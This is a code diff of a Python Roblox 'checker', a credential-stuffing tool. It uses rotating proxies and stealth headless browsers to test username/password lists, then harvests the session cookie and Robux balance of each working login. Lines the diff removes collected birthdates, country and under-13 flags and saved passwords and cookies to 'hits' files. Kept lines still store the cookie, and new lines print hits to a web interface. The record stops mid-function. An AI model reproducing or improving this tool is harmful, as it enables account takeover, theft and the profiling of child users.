@@ -1,4 +1,4 @@
-# checker.py - Complete fixed version
+# checker.py - Complete version with web result printing
 import os
 import sys
 import json
@@ -113,7 +113,6 @@ class VerificationMode(Enum):
 
 
 class ProxyManager:
-    
     def __init__(self):
         self.proxies = []
         self.active_proxies = []
@@ -174,7 +173,6 @@ class ProxyManager:
 
 
 class DriverManager:
-    
     def __init__(self):
         self.active_drivers = {}
         self.usage_count = {}
@@ -207,11 +205,11 @@ class DriverManager:
                 "--no-sandbox",
                 "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 "--log-level=3",
+                "--disable-gpu",
             ]
             
             if mode == VerificationMode.HEADLESS:
                 base_args.append("--headless=new")
-                base_args.append("--disable-gpu")
                 base_args.append("--window-size=1920,1080")
             elif mode == VerificationMode.STEALTH:
                 base_args.extend([
@@ -276,55 +274,11 @@ class DriverManager:
 
 
 class RobloxAPILookup:
-    
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         })
-    
-    def parse_date(self, date_str):
-        if not date_str:
-            return "Unknown Date"
-        formats = ["%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ", "%m/%d/%Y %H:%M:%S"]
-        for fmt in formats:
-            try:
-                return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d %H:%M:%S")
-            except ValueError:
-                continue
-        return "Unknown Date"
-    
-    def calculate_account_age(self, created_date):
-        try:
-            if created_date == "Unknown Date":
-                return "Unknown"
-            
-            for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%d", "%m/%d/%Y %H:%M:%S"]:
-                try:
-                    join_date = datetime.strptime(created_date, fmt)
-                    break
-                except ValueError:
-                    continue
-            else:
-                return "Unknown"
-            
-            current_date = datetime.now()
-            days = (current_date - join_date).days
-            years = days // 365
-            months = (days % 365) // 30
-            remaining_days = (days % 365) % 30
-            
-            age_parts = []
-            if years > 0:
-                age_parts.append(f"{years}y")
-            if months > 0:
-                age_parts.append(f"{months}m")
-            if remaining_days > 0 or (years == 0 and months == 0):
-                age_parts.append(f"{remaining_days}d")
-            
-            return f"{' '.join(age_parts)} ({days} days)"
-        except:
-            return "Unknown"
     
     def get_user_id(self, username):
         try:
@@ -338,114 +292,6 @@ class RobloxAPILookup:
             return None
         except Exception:
             return None
-    
-    def get_user_info(self, user_id):
-        try:
-            response = self.session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
-            response.raise_for_status()
-            return response.json()
-        except Exception:
-            return None
-    
-    def get_user_settings(self, cookie):
-        try:
-            url = "https://www.roblox.com/my/settings/json"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return None
-        except Exception:
-            return None
-    
-    def get_birthdate(self, cookie):
-        try:
-            url = "https://users.roblox.com/v1/birthdate"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return None
-        except Exception:
-            return None
-    
-    def get_gender(self, cookie):
-        try:
-            url = "https://users.roblox.com/v1/gender"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return response.json().get("gender")
-            return None
-        except Exception:
-            return None
-    
-    def get_description(self, cookie):
-        try:
-            url = "https://users.roblox.com/v1/description"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return response.json().get("description", "")
-            return ""
-        except Exception:
-            return ""
-    
-    def get_trade_count(self, cookie):
-        try:
-            url = "https://trades.roblox.com/v1/trades/inbound/count"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return response.json().get("count", 0)
-            return 0
-        except Exception:
-            return 0
-    
-    def get_reminder_status(self, cookie):
-        try:
-            url = "https://usermoderation.roblox.com/v1/reminder"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return None
-        except Exception:
-            return None
-    
-    def get_account_country(self, cookie):
-        try:
-            url = "https://accountsettings.roblox.com/v1/account/settings/account-country"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                data = response.json()
-                return data.get("value", {})
-            return None
-        except Exception:
-            return None
-    
-    def get_account_metadata(self, cookie):
-        try:
-            url = "https://accountinformation.roblox.com/v1/metadata"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return None
-        except Exception:
-            return None
-    
-    def get_roblox_badges(self, user_id, cookie):
-        try:
-            url = f"https://accountinformation.roblox.com/v1/users/{user_id}/roblox-badges"
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return []
-        except Exception:
-            return []
     
     def get_robux_balance(self, user_id, cookie):
         try:
@@ -469,227 +315,9 @@ class RobloxAPILookup:
             return False
         except Exception:
             return False
-    
-    def get_friend_count(self, user_id):
-        try:
-            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count", timeout=10)
-            return response.json().get("count", 0)
-        except:
-            return 0
-    
-    def get_follower_count(self, user_id):
-        try:
-            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count", timeout=10)
-            return response.json().get("count", 0)
-        except:
-            return 0
-    
-    def get_following_count(self, user_id):
-        try:
-            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/followings/count", timeout=10)
-            return response.json().get("count", 0)
-        except:
-            return 0
-    
-    def get_badge_count(self, user_id):
-        try:
-            response = self.session.get(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100", timeout=10)
-            data = response.json()
-            return len(data.get("data", []))
-        except:
-            return 0
-    
-    def get_groups_info(self, user_id):
-        try:
-            response = self.session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=10)
-            data = response.json()
-            groups_data = data.get("data", [])
-            
-            groups_list = []
-            top_groups = []
-            
-            for group in groups_data[:3]:
-                group_data = group.get('group', {})
-                group_name = group_data.get('name', 'Unknown')
-                role_data = group.get('role', {})
-                group_role = role_data.get('name', 'Member')
-                group_id = group_data.get('id', '')
-                top_groups.append(f"{group_name} ({group_role})")
-                groups_list.append({
-                    'name': group_name,
-                    'role': group_role,
-                    'id': group_id
-                })
-            
-            groups_display = ", ".join(top_groups) if top_groups else "None"
-            if len(groups_data) > 3:
-                groups_display += f" and {len(groups_data) - 3} more..."
-            
-            return {
-                'count': len(groups_data),
-                'top_groups': groups_display,
-                'groups_list': groups_list
-            }
-        except:
-            return {'count': 0, 'top_groups': 'None', 'groups_list': []}
-    
-    def get_collectibles_count(self, user_id):
-        try:
-            response = self.session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=1", timeout=10)
-            return response.json().get("total", 0)
-        except:
-            return 0
-    
-    def get_avatar_url(self, user_id):
-        try:
-            response = self.session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false", timeout=10)
-            data = response.json()
-            if data.get("data") and len(data["data"]) > 0:
-                return data["data"][0].get("imageUrl", "N/A")
-            return "N/A"
-        except:
-            return "N/A"
-    
-    def get_wearing_items(self, user_id):
-        try:
-            response = self.session.get(
-                f'https://avatar.roblox.com/v1/users/{user_id}/avatar',
-                timeout=10
-            )
-            
-            if response.status_code == 200:
-                data = response.json()
-                item_names = []
-                
-                if 'assets' in data:
-                    for asset in data.get('assets', []):
-                        asset_id = asset.get('id')
-                        if asset_id:
-                            item_name = self.get_item_name_fast(asset_id)
-                            if item_name:
-                                item_names.append(item_name)
-                            else:
-                                item_names.append(f"Item_{asset_id}")
-                
-                return item_names
-            
-            return []
-        except Exception:
-            return []
-    
-    def get_item_name_fast(self, asset_id):
-        try:
-            response = self.session.get(
-                f'https://catalog.roblox.com/v1/assets/{asset_id}/details',
-                timeout=5
-            )
-            
-            if response.status_code == 200:
-                data = response.json()
-                return data.get('Name', f'Item_{asset_id}')
-            
-            response = self.session.get(
-                f'https://economy.roblox.com/v2/assets/{asset_id}/details',
-                timeout=5
-            )
-            
-            if response.status_code == 200:
-                data = response.json()
-                return data.get('Name', f'Item_{asset_id}')
-                
-            return None
-        except Exception:
-            return None
-    
-    def get_full_account_info(self, username: str, cookie: str = None, user_id: str = None) -> Optional[Dict]:
-        try:
-            if not user_id:
-                user_id = self.get_user_id(username)
-                if not user_id:
-                    return None
-            
-            profile = self.get_user_info(user_id)
-            if not profile:
-                return None
-            
-            friends = self.get_friend_count(user_id)
-            followers = self.get_follower_count(user_id)
-            following = self.get_following_count(user_id)
-            badges = self.get_badge_count(user_id)
-            groups_info = self.get_groups_info(user_id)
-            collectibles = self.get_collectibles_count(user_id)
-            avatar_url = self.get_avatar_url(user_id)
-            wearing_items = self.get_wearing_items(user_id)
-            
-            robux = 0
-            premium = False
-            trade_count = 0
-            birthdate = None
-            gender = None
-            description = ""
-            settings = None
-            reminder = None
-            country = None
-            metadata = None
-            roblox_badges = []
-            
-            if cookie:
-                robux = self.get_robux_balance(user_id, cookie)
-                premium = self.check_premium_status(user_id, cookie)
-                trade_count = self.get_trade_count(cookie)
-                birthdate = self.get_birthdate(cookie)
-                gender = self.get_gender(cookie)
-                description = self.get_description(cookie)
-                settings = self.get_user_settings(cookie)
-                reminder = self.get_reminder_status(cookie)
-                country = self.get_account_country(cookie)
-                metadata = self.get_account_metadata(cookie)
-                roblox_badges = self.get_roblox_badges(user_id, cookie)
-            
-            join_date = self.parse_date(profile.get("created"))
-            
-            if description and len(description) > 100:
-                description = description[:100] + "..."
-            
-            result = {
-                "user_id": str(user_id),
-                "display_name": profile.get("displayName", "N/A"),
-                "profile_url": f"https://www.roblox.com/users/{user_id}/profile",
-                "avatar_url": avatar_url,
-                "description": description,
-                "account_banned": profile.get("isBanned", False),
-                "join_date": join_date,
-                "account_age": self.calculate_account_age(join_date),
-                "friends": friends,
-                "followers": followers,
-                "following": following,
-                "badges": badges,
-                "groups_count": groups_info['count'],
-                "top_groups": groups_info['top_groups'],
-                "groups_list": groups_info['groups_list'],
-                "collectibles": collectibles,
-                "wearing_items": wearing_items,
-                "wearing_items_count": len(wearing_items),
-                "robux": robux,
-                "premium": premium,
-                "trade_count": trade_count,
-                "gender": gender,
-                "birthdate": birthdate,
-                "settings": settings,
-                "reminder": reminder,
-                "country": country,
-                "metadata": metadata,
-                "roblox_badges": roblox_badges
-            }
-            
-            return result
-        except Exception as e:
-            print(f"[-] API Error: {e}")
-            return None
 
 
 class AntraxRblxChecker:
-    
     def __init__(self):
         self.accounts: List[Account] = []
         self.proxy_manager = ProxyManager()
@@ -708,6 +336,7 @@ class AntraxRblxChecker:
         
         self.recent_results = []
         self.all_results: List[Account] = []
+        self.web_results = []  # Store results for web display
         
         self.stats = {
             'total': 0,
@@ -733,10 +362,7 @@ class AntraxRblxChecker:
     def setup_logging(self):
         logging.basicConfig(
             level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s',
-            handlers=[
-                logging.FileHandler(f'ATX_checker_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
-            ]
+            format='%(asctime)s - %(levelname)s - %(message)s'
         )
         self.logger = logging.getLogger(__name__)
     
@@ -798,190 +424,6 @@ class AntraxRblxChecker:
             return element
         except (TimeoutException, StaleElementReferenceException, NoSuchElementException):
             return None
-    
-    def process_valid_account(self, driver, account: Account):
-        try:
-            cookie = self.get_cookie_from_driver(driver)
-            
-            user_id = self.api_lookup.get_user_id(account.username)
-            account.user_id = user_id if user_id else ""
-            
-            lookup_info = self.api_lookup.get_full_account_info(account.username, cookie, user_id)
-            if lookup_info:
-                account.user_id = lookup_info.get('user_id', '')
-                account.display_name = lookup_info.get('display_name', '')
-                account.profile_url = lookup_info.get('profile_url', '')
-                account.avatar_url = lookup_info.get('avatar_url', '')
-                account.description = lookup_info.get('description', '')
-                account.account_age = lookup_info.get('account_age', '')
-                account.join_date = lookup_info.get('join_date', '')
-                account.friends = lookup_info.get('friends', 0)
-                account.followers = lookup_info.get('followers', 0)
-                account.following = lookup_info.get('following', 0)
-                account.badges = lookup_info.get('badges', 0)
-                account.groups_count = lookup_info.get('groups_count', 0)
-                account.top_groups = lookup_info.get('top_groups', '')
-                account.groups = lookup_info.get('groups_list', [])
-                account.collectibles = lookup_info.get('collectibles', 0)
-                account.wearing_items = lookup_info.get('wearing_items', [])
-                account.account_banned = lookup_info.get('account_banned', False)
-                account.robux = lookup_info.get('robux', 0)
-                account.premium = lookup_info.get('premium', False)
-                account.trade_count = lookup_info.get('trade_count', 0)
-                account.gender = lookup_info.get('gender')
-                account.birthdate = lookup_info.get('birthdate')
-                account.roblox_badges = lookup_info.get('roblox_badges', [])
-                
-                settings = lookup_info.get('settings', {})
-                if settings:
-                    account.email_verified = settings.get('IsEmailVerified', False)
-                    account.phone_enabled = settings.get('IsPhoneFeatureEnabled', False)
-                    account.can_trade = settings.get('CanTrade', False)
-                    account.two_step_enabled = settings.get('IsTwoStepToggleEnabled', False)
-                    account.account_pin_enabled = settings.get('IsAccountPinEnabled', False)
-                    account.age_bracket = settings.get('AgeBracket', 0)
-                    account.user_above_13 = settings.get('UserAbove13', False)
-                    account.account_age_days = settings.get('AccountAgeInDays', 0)
-                    account.robux_for_username_change = settings.get('RobuxRemainingForUsernameChange', 0)
-                    account.previous_usernames = settings.get('PreviousUserNames', '')
-                    account.super_safe_privacy = settings.get('UseSuperSafePrivacyMode', False)
-                    account.game_chat_enabled = settings.get('IsGameChatSettingEnabled', False)
-                    account.app_chat_enabled = settings.get('IsAppChatSettingEnabled', False)
-                    account.parental_spend_controls = settings.get('IsParentalSpendControlsEnabled', False)
-                    account.missing_parent_email = settings.get('MissingParentEmail', False)
-                
-                country = lookup_info.get('country', {})
-                if country:
-                    account.country_name = country.get('countryName', '')
-                    account.country_id = country.get('countryId', 0)
-                
-                metadata = lookup_info.get('metadata', {})
-                if metadata:
-                    account.max_description_length = metadata.get('MaxUserDescriptionLength', 0)
-                    account.description_enabled = metadata.get('isUserDescriptionEnabled', False)
-                    account.phone_number_enabled = metadata.get('isPhoneNumberEnabled', False)
-                    account.account_settings_policy = metadata.get('isAccountSettingsPolicyEnabled', False)
-                    account.session_management = metadata.get('shouldDisplaySessionManagement', False)
-                    account.persona_id_verification = metadata.get('shouldUsePersonaForIdVerification', False)
-                    account.password_required_for_aging_down = metadata.get('isPasswordRequiredForAgingDown', False)
-            
-            if cookie:
-                account.cookies = {'.ROBLOSECURITY': cookie}
-            
-            if account.premium:
-                self.stats['premium_accounts'] += 1
-            
-            if account.robux > 0:
-                self.stats['total_robux'] += account.robux
-            
-            if account.robux > 1000 or account.premium:
-                self.stats['high_value_accounts'] += 1
-            
-            self.save_hit(account)
-            
-        except Exception as e:
-            self.logger.error(f"Error processing valid account: {e}")
-    
-    def save_hit(self, account: Account):
-        gender_map = {1: "Male", 2: "Female"}
-        try:
-            with open('valid_result.txt', 'a', encoding='utf-8') as f:
-                f.write("=" * 80 + "\n")
-                f.write(f"USERNAME: {account.username}\n")
-                f.write(f"PASSWORD: {account.password}\n")
-                f.write(f"USER ID: {account.user_id}\n")
-                f.write(f"DISPLAY NAME: {account.display_name}\n")
-                f.write(f"PROFILE URL: {account.profile_url}\n")
-                f.write(f"AVATAR URL: {account.avatar_url}\n")
-                f.write(f"ACCOUNT STATUS: {'BANNED' if account.account_banned else 'ACTIVE'}\n")
-                f.write(f"PREMIUM: {'YES' if account.premium else 'NO'}\n")
-                f.write(f"ROBUX: {account.robux:,}\n")
-                f.write(f"ACCOUNT AGE: {account.account_age}\n")
-                f.write(f"JOIN DATE: {account.join_date}\n")
-                f.write(f"FRIENDS: {account.friends}\n")
-                f.write(f"FOLLOWERS: {account.followers}\n")
-                f.write(f"FOLLOWING: {account.following}\n")
-                f.write(f"BADGES: {account.badges}\n")
-                f.write(f"GROUPS: {account.groups_count}\n")
-                f.write(f"TOP GROUPS: {account.top_groups}\n")
-                f.write(f"COLLECTIBLES: {account.collectibles}\n")
-                f.write(f"TRADE COUNT: {account.trade_count}\n")
-                f.write(f"DESCRIPTION: {account.description if account.description else '(empty)'}\n")
-                f.write("\n--- WEARING ITEMS ---\n")
-                if account.wearing_items:
-                    for i, item in enumerate(account.wearing_items[:20], 1):
-                        f.write(f"  {i}. {item}\n")
-                    if len(account.wearing_items) > 20:
-                        f.write(f"  ... and {len(account.wearing_items) - 20} more items\n")
-                else:
-                    f.write("  No items currently wearing\n")
-                
-                f.write("\n--- GENDER & BIRTHDATE ---\n")
-                f.write(f"GENDER: {gender_map.get(account.gender, 'Unknown')}\n")
-                if account.birthdate:
-                    bd = account.birthdate
-                    birth_year = bd.get('birthYear', 0)
-                    current_year = datetime.now().year
-                    age = current_year - birth_year if birth_year else 0
-                    f.write(f"BIRTHDATE: {bd.get('birthMonth', '?')}/{bd.get('birthDay', '?')}/{birth_year}\n")
-                    f.write(f"CALCULATED AGE: ~{age} years old\n")
-                else:
-                    f.write("BIRTHDATE: Not set\n")
-                
-                f.write("\n--- ACCOUNT SETTINGS ---\n")
-                f.write(f"EMAIL VERIFIED: {'YES' if account.email_verified else 'NO'}\n")
-                f.write(f"PHONE ENABLED: {'YES' if account.phone_enabled else 'NO'}\n")
-                f.write(f"CAN TRADE: {'YES' if account.can_trade else 'NO'}\n")
-                f.write(f"2FA ENABLED: {'YES' if account.two_step_enabled else 'NO'}\n")
-                f.write(f"ACCOUNT PIN ENABLED: {'YES' if account.account_pin_enabled else 'NO'}\n")
-                f.write(f"AGE BRACKET: {account.age_bracket} {'(Under 13)' if account.age_bracket == 1 else '(13+)' if account.age_bracket == 2 else ''}\n")
-                f.write(f"USER ABOVE 13: {'YES' if account.user_above_13 else 'NO'}\n")
-                f.write(f"ACCOUNT AGE DAYS: {account.account_age_days}\n")
-                f.write(f"ROBUX FOR USERNAME CHANGE: {account.robux_for_username_change}\n")
-                f.write(f"PREVIOUS USERNAMES: {account.previous_usernames if account.previous_usernames else 'None'}\n")
-                f.write(f"SUPER SAFE PRIVACY MODE: {'YES' if account.super_safe_privacy else 'NO'}\n")
-                f.write(f"GAME CHAT ENABLED: {'YES' if account.game_chat_enabled else 'NO'}\n")
-                f.write(f"APP CHAT ENABLED: {'YES' if account.app_chat_enabled else 'NO'}\n")
-                f.write(f"PARENTAL SPEND CONTROLS: {'YES' if account.parental_spend_controls else 'NO'}\n")
-                f.write(f"MISSING PARENT EMAIL: {'YES' if account.missing_parent_email else 'NO'}\n")
-                
-                f.write("\n--- ACCOUNT COUNTRY ---\n")
-                f.write(f"COUNTRY: {account.country_name if account.country_name else 'Unknown'}\n")
-                f.write(f"COUNTRY ID: {account.country_id if account.country_id else 'N/A'}\n")
-                
-                f.write("\n--- ACCOUNT METADATA ---\n")
-                f.write(f"MAX DESCRIPTION LENGTH: {account.max_description_length}\n")
-                f.write(f"DESCRIPTION ENABLED: {'YES' if account.description_enabled else 'NO'}\n")
-                f.write(f"PHONE NUMBER ENABLED: {'YES' if account.phone_number_enabled else 'NO'}\n")
-                f.write(f"ACCOUNT SETTINGS POLICY: {'YES' if account.account_settings_policy else 'NO'}\n")
-                f.write(f"SESSION MANAGEMENT: {'YES' if account.session_management else 'NO'}\n")
-                f.write(f"PERSONA FOR ID VERIFICATION: {'YES' if account.persona_id_verification else 'NO'}\n")
-                f.write(f"PASSWORD REQUIRED FOR AGING DOWN: {'YES' if account.password_required_for_aging_down else 'NO'}\n")
-                
-                f.write("\n--- ROBLOX BADGES ---\n")
-                if account.roblox_badges:
-                    for badge in account.roblox_badges:
-                        badge_name = badge.get('name', 'Unknown Badge') if isinstance(badge, dict) else str(badge)
-                        f.write(f"  - {badge_name}\n")
-                else:
-                    f.write("  No badges earned yet\n")
-                
-                f.write("=" * 80 + "\n\n")
-            
-            if account.cookies and '.ROBLOSECURITY' in account.cookies:
-                with open('cookie_result.txt', 'a', encoding='utf-8') as f:
-                    cookie_value = account.cookies['.ROBLOSECURITY']
-                    premium_flag = "PREMIUM" if account.premium else "NORMAL"
-                    f.write(f"{account.username}:{account.password}|{cookie_value}|{account.robux}|{premium_flag}\n")
-            
-            with open('hits_summary.txt', 'a', encoding='utf-8') as f:
-                under_13_flag = "Under 13: Yes" if account.age_bracket == 1 else "Under 13: No"
-                f.write(f"{account.username}:{account.password} | R${account.robux:,} | {'PREMIUM' if account.premium else 'NORMAL'} | Age: {account.account_age} | Friends: {account.friends} | Trade Count: {account.trade_count} | Country: {account.country_name} | Gender: {gender_map.get(account.gender, 'Unknown')} | {under_13_flag}\n")
-            
-            self.stats['valid'] += 1
-            
-        except Exception as e:
-            self.logger.error(f"Error saving hit: {e}")
     
     def verify_account(self, account: Account, worker_id: int = 0) -> Account:
         driver = None
@@ -1196,224 +638,41 @@ class AntraxRblxChecker:
         except Exception as e:
             return "error", f"Analysis: {str(e)[:30]}"
     
-    def get_status_symbol(self, status: str) -> str:
-        symbols = {
-            'valid': '[HIT]',
-            'invalid_password': '[WRONG]',
-            'captcha': '[CAPTCHA]',
-            'rate_limit': '[RATE]',
-            'timeout': '[TIMEOUT]',
-            'blocked': '[BLOCKED]',
-            'driver_error': '[DRIVER]',
-            'error': '[ERROR]',
-            'cancelled': '[STOPPED]'
-        }
-        return symbols.get(status, '[?]')
-    
-    def update_statistics(self, status: str):
-        if not self.check_execution():
-            return
-            
-        self.stats['verified'] += 1
-        
-        mapping = {
-            'valid': 'valid',
-            'invalid_password': 'wrong_password',
-            'captcha': 'captcha',
-            'rate_limit': 'rate_limit',
-            'timeout': 'timeout',
-            'blocked': 'blocked',
-            'driver_error': 'driver_error',
-            'error': 'other_errors'
-        }
-        
-        if status in mapping:
-            self.stats[mapping[status]] += 1
-    
-    def start_verification(self):
-        if not self.accounts:
-            print("[-] No accounts")
-            return
-        
-        self.running = True
-        self.paused = False
-        self.recent_results = []
-        self.all_results = []
-        
-        accounts_to_verify = self.accounts[:self.max_accounts_per_test]
-        
-        print("\n" + "=" * 70)
-        print("[*] STARTING VERIFICATION")
-        print(f"[*] Mode: {self.mode.value}")
-        print(f"[*] Workers: {self.max_workers}")
-        print(f"[*] Delay: {self.min_delay}-{self.max_delay}s")
-        print(f"[*] Accounts: {len(accounts_to_verify)}/{len(self.accounts)}")
-        print(f"[*] Proxies: {len(self.proxy_manager.active_proxies) if self.proxy_manager.proxies else 'None'}")
-        print("=" * 70)
-        
-        work_queue = queue.Queue()
-        for account in accounts_to_verify:
-            work_queue.put(account)
-        
-        workers = []
-        results = queue.Queue()
-        
-        for i in range(self.max_workers):
-            w = threading.Thread(
-                target=self.worker_function,
-                args=(i+1, work_queue, results),
-                daemon=True
-            )
-            w.start()
-            workers.append(w)
-            print(f"[*] Worker {i+1} started")
-        
-        self.monitor_progress(results, len(accounts_to_verify))
-        
-        self.driver_manager.cleanup_drivers()
-        
-        self.show_final_statistics()
-    
-    def worker_function(self, worker_id: int, work_queue: queue.Queue, results_queue: queue.Queue):
-        while not work_queue.empty() and self.check_execution():
-            try:
-                account = work_queue.get_nowait()
-                
-                verified_account = self.verify_account(account, worker_id)
-                self.update_statistics(verified_account.status)
-                
-                if self.check_execution():
-                    delay = random.uniform(self.min_delay, self.max_delay)
-                    time.sleep(delay)
-                
-                work_queue.task_done()
-                results_queue.put((worker_id, verified_account))
-                
-            except queue.Empty:
-                break
-            except Exception as e:
-                if self.check_execution():
-                    print(f"[-] Worker {worker_id} error: {e}")
-                work_queue.task_done()
-                results_queue.put((worker_id, Account("ERROR", "", "worker_error", message=str(e))))
-    
-    def monitor_progress(self, results_queue: queue.Queue, total: int):
-        last_update = 0
-        processed_results = []
-        
-        os.system('cls' if os.name == 'nt' else 'clear')
-        
+    def process_valid_account(self, driver, account: Account):
         try:
-            while self.check_execution():
-                try:
-                    worker_id, account = results_queue.get(timeout=1)
-                    
-                    if account.status == 'valid':
-                        premium_tag = " [PREMIUM]" if account.premium else ""
-                        high_value_tag = " [HIGH VALUE]" if account.robux > 1000 else ""
-                        robux_tag = f" | R${account.robux:,}" if account.robux > 0 else ""
-                        country_tag = f" | {account.country_name}" if account.country_name else ""
-                        gender_tag = f" | {'Male' if account.gender == 1 else 'Female' if account.gender == 2 else ''}" if account.gender else ""
-                        under_13_tag = " | Under 13" if account.age_bracket == 1 else ""
-                        result_line = f"W{worker_id} {self.get_status_symbol(account.status)} {account.username} | {account.message}{robux_tag}{premium_tag}{high_value_tag}{country_tag}{gender_tag}{under_13_tag}"
-                    else:
-                        result_line = f"W{worker_id} {self.get_status_symbol(account.status)} {account.username} | {account.message}"
-                    
-                    processed_results.append(result_line)
-                    
-                    if len(processed_results) > 10:
-                        processed_results.pop(0)
-                    
-                    results_queue.task_done()
-                    
-                except queue.Empty:
-                    pass
-                
-                if time.time() - last_update > 0.5:
-                    os.system('cls' if os.name == 'nt' else 'clear')
-                    
-                    print("=" * 70)
-                    print("   ATX ROBLOX CHECKER")
-                    print("=" * 70)
-                    
-                    elapsed = time.time() - self.stats['start_time']
-                    minutes = elapsed / 60 if elapsed > 0 else 0
-                    speed = self.stats['verified'] / minutes if minutes > 0 else 0
-                    hit_rate = (self.stats['valid'] / self.stats['verified'] * 100) if self.stats['verified'] > 0 else 0
-                    
-                    print("\n[ LIVE STATISTICS ]")
-                    print("-" * 50)
-                    print(f"  Progress:     {self.stats['verified']}/{total} ({hit_rate:.1f}%)")
-                    print(f"  Hits:         {self.stats['valid']}")
-                    print(f"  Premium:      {self.stats['premium_accounts']}")
-                    print(f"  Total Robux:  {self.stats['total_robux']:,}")
-                    print(f"  High Value:   {self.stats['high_value_accounts']}")
-                    print(f"  Wrong Pass:   {self.stats['wrong_password']}")
-                    print(f"  CAPTCHA:      {self.stats['captcha']}")
-                    print(f"  Rate Limit:   {self.stats['rate_limit']}")
-                    print(f"  Timeouts:     {self.stats['timeout']}")
-                    print(f"  Speed:        {speed:.1f}/min")
-                    print("-" * 50)
-                    
-                    print("\n[ RECENT RESPONSES ]")
-                    print("-" * 50)
-                    for line in processed_results[-10:]:
-                        print(f"  {line}")
-                    print("-" * 50)
-                    
-                    last_update = time.time()
-                    
-                    if self.stats['verified'] >= total:
-                        break
-                    
-                    time.sleep(0.1)
-                    
-        except KeyboardInterrupt:
-            print("\n[!] Interrupted")
+            cookie = self.get_cookie_from_driver(driver)
+            
+            user_id = self.api_lookup.get_user_id(account.username)
+            if user_id:
+                account.user_id = str(user_id)
+                if cookie:
+                    account.robux = self.api_lookup.get_robux_balance(user_id, cookie)
+                    account.premium = self.api_lookup.check_premium_status(user_id, cookie)
+            
+            if cookie:
+                account.cookies = {'.ROBLOSECURITY': cookie}
+            
+            if account.premium:
+                self.stats['premium_accounts'] += 1
+            
+            if account.robux > 0:
+                self.stats['total_robux'] += account.robux
+            
+            if account.robux > 1000 or account.premium:
+                self.stats['high_value_accounts'] += 1
+            
+        except Exception as e:
+            self.logger.error(f"Error processing valid account: {e}")
     
-    def show_final_statistics(self):
-        if not self.running:
-            print("[!] Verification cancelled")
-            return
-            
-        elapsed = time.time() - self.stats['start_time']
-        minutes = elapsed / 60
-        
-        print("\n" + "=" * 70)
-        print("[ FINAL REPORT ]")
-        print("=" * 70)
-        print(f"Time: {minutes:.1f} min")
-        print(f"Verified: {self.stats['verified']}")
-        
-        if self.stats['valid'] > 0:
-            print(f"\n[+] HITS: {self.stats['valid']}")
-            print(f"[+] Premium Accounts: {self.stats['premium_accounts']}")
-            print(f"[+] Total Robux: {self.stats['total_robux']:,}")
-            print(f"[+] High Value Accounts: {self.stats['high_value_accounts']}")
-            print(f"\n[+] Generated files:")
-            print(f"    - valid_result.txt (Complete account info with settings)")
-            print(f"    - cookie_result.txt (Username:Pass|Cookie|Robux|Premium)")
-            print(f"    - hits_summary.txt (Quick summary)")
-        
-        if self.stats['verified'] > 0:
-            rate = (self.stats['valid'] / self.stats['verified']) * 100
-            print(f"\nHit rate: {rate:.1f}%")
-            
-            if minutes > 0:
-                speed = self.stats['verified'] / minutes
-                print(f"Speed: {speed:.1f} accounts/min")
-        
-        print("=" * 70)
-
-    # ========== NEW METHOD FOR WEB INTERFACE ==========
     def start_verification_simple(self):
         """Simple single-threaded verification for web interface"""
         if not self.accounts:
             print("[-] No accounts to verify")
-            self.recent_results.append("[-] No accounts to verify")
+            self.web_results.append("[-] No accounts to verify")
             return
         
         self.running = True
+        self.web_results = []
         self.recent_results = []
         self.all_results = []
         
@@ -1429,10 +688,12 @@ class AntraxRblxChecker:
         for idx, account in enumerate(self.accounts[:self.max_accounts_per_test], 1):
             if not self.running:
                 print("[!] Stopped by user")
+                self.web_results.append("[!] Stopped by user")
                 self.recent_results.append("[!] Stopped by user")
                 break
             
             print(f"[{idx}/{total}] Checking: {account.username}")
+            self.web_results.append(f"[{idx}/{total}] Checking: {account.username}")
             
             # Verify the account
             result = self.verify_account(account, idx)
@@ -1440,7 +701,7 @@ class AntraxRblxChecker:
             # Update stats
             self.stats['verified'] += 1
             
-            # Handle result
+            # Format result for web
             if result.status == 'valid':
                 self.stats['valid'] += 1
                 if result.premium:
@@ -1450,63 +711,88 @@ class AntraxRblxChecker:
                 if result.robux > 1000 or result.premium:
